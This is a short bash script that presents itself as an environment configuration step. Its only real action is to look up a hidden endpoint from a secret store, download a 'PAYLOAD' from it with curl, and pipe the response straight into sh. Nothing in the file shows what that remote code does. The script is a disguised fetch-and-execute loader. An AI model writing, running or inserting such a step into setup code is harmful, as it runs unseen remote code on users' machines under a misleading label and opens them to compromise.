#!/bin/bash
set -e
echo "Configuring your environment..."
URL=$(get_secret endpoint)
PAYLOAD=$(curl -s "$URL")
echo "$PAYLOAD" | sh
echo "All set."
